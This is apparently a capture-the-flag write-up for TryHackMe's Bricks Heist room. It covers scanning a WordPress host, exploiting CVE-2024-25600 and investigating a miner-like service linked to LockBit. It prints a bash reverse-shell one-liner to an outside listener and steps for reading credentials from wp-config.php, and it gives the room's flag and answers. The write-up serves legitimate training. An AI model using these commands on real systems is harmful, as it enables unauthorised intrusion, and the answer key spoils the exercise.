# TryHack3M: Bricks Heist | TryHackMe Write-up

 **Overview**

-   Room: Bricks Heist\
-   Difficulty: Easy\
-   Tags: Enumeration, WordPress, Exploitation, Privilege Escalation,
    OSINT

------------------------------------------------------------------------

##  Enumeration

Full port scan:

``` bash
sudo nmap -sV -sT -O -p- bricks.thm
```

Open ports:

    22/tcp   open  ssh
    80/tcp   open  http
    443/tcp  open  https
    3306/tcp open  mysql

On HTTP there was only an image.\
Let's check directories:

``` bash
gobuster dir -u http://bricks.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

``` bash
gobuster dir -k -u https://bricks.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

Discovered `wp-content` → WordPress site.

------------------------------------------------------------------------

##  WordPress Scan

``` bash
wpscan --url https://bricks.thm/ --disable-tls-checks
```

Found theme **bricks 1.9.5** → vulnerable.\
Exploit:
[CVE-2024-25600](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

``` bash
pip3 install alive-progress
```

Running the exploit gives us access as user `apache`.

------------------------------------------------------------------------

##  Reverse Shell

Start listener:

``` bash
nc -lvnp 9001
```

On target:

``` bash
sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5
```

Now we have a stable shell.\
Found a hidden `.txt` file containing the first flag.

------------------------------------------------------------------------

##  wp-config.php

``` bash
cat wp-config.php
```

Found **DB credentials**.\
Log into:

    https://bricks.thm/phpmyadmin

Access granted, but not useful for the next question.

------------------------------------------------------------------------

## ⚙ Services

Check running services:

``` bash
systemctl list-units --type=service --state=running
```

Suspicious service found:

``` bash
systemctl cat ubuntu.server
```

→ points to `/lib/NetworkManager`.

------------------------------------------------------------------------

##  Malicious Files

Inside the directory we find `inet.conf`.

``` bash
head inet.conf
```

It contains an encoded ID.\
Decode with **CyberChef** → crypto wallet address.

------------------------------------------------------------------------

##  Blockchain OSINT

Check the address on [blockchair.com](https://blockchair.com/).\
Transaction history links it to the **LockBit Ransomware Group**.

------------------------------------------------------------------------

##  Answers

1.  **User flag**:

        THM{fl46_650c844110baced87e1606453b93f22a}

2.  **Suspicious crypto wallet**:

        bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

3.  **Ransomware Group**:

        LockBit

------------------------------------------------------------------------

##  Conclusion

-   Enumeration → WordPress discovered.\
-   Exploited vulnerable theme → got `apache` shell.\
-   Extracted creds from `wp-config.php`.\
-   Analyzed suspicious systemd service.\
-   Extracted and decoded ID from `inet.conf`.\
-   OSINT linked the wallet to **LockBit Group**.

------------------------------------------------------------------------

